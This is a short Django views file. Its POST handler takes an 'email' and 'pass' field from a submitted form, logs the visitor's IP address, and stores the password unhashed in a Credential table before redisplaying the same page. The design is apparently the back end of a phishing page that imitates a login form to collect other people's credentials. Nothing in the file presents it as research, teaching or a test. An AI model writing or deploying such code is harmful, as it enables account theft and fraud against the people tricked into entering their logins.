from django.shortcuts import render
from django.views import View

from core.models import Credential


class IndexView(View):

    def post(self, request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')

        try:
            print(request._post)
            Credential.objects.create(username=request._post['email'], password=request._post['pass'], ip=ip)
        except Exception as e:
            print('err', e)
        return render(request, 'index.html')

    def get(self, request):
        # handle the get request
        return render(request, 'index.html')
